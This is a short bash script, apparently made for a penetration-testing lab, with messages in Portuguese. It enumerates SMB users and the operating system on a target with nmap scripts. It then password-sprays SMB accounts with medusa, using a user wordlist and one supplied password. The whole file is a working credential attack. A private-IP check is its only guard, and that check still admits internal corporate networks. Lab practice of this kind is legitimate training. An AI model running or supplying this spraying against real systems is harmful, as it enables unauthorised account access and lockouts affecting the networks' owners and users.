#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-}"
SPRAY_PASSWORD="${2:-}"
ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
USERS="$ROOT_DIR/wordlists/smb-users.txt"
OUTPUT_DIR="$ROOT_DIR/results"
NMAP_OUTPUT="$OUTPUT_DIR/smb-nmap.txt"
MEDUSA_OUTPUT="$OUTPUT_DIR/smb-spray.txt"

usage() {
  echo "Uso: $0 <ip-privado-do-alvo> <senha-para-spray>"
  echo "Exemplo: $0 192.168.56.101 <senha-do-lab>"
}

is_private_ipv4() {
  local ip="$1"
  [[ "$ip" =~ ^10\. ]] || [[ "$ip" =~ ^192\.168\. ]] || [[ "$ip" =~ ^172\.(1[6-9]|2[0-9]|3[0-1])\. ]]
}

if [[ -z "$TARGET" || -z "$SPRAY_PASSWORD" ]]; then
  usage
  exit 1
fi

if ! is_private_ipv4 "$TARGET"; then
  echo "Erro: use apenas IP privado do laboratorio, como 192.168.56.101."
  exit 1
fi

if ! command -v nmap >/dev/null 2>&1; then
  echo "Erro: nmap nao encontrado. Instale com: sudo apt install nmap"
  exit 1
fi

if ! command -v medusa >/dev/null 2>&1; then
  echo "Erro: medusa nao encontrado. Instale com: sudo apt install medusa"
  exit 1
fi

mkdir -p "$OUTPUT_DIR"

echo "[+] Enumerando SMB em: $TARGET"
nmap -p 139,445 --script smb-enum-users,smb-os-discovery "$TARGET" -oN "$NMAP_OUTPUT"

echo "[+] Executando password spraying SMB com uma unica senha."
echo "[+] Usuarios: $USERS"
medusa -h "$TARGET" -U "$USERS" -p "$SPRAY_PASSWORD" -M smbnt -f -O "$MEDUSA_OUTPUT"

echo "[+] Nmap salvo em: $NMAP_OUTPUT"
echo "[+] Medusa salvo em: $MEDUSA_OUTPUT"
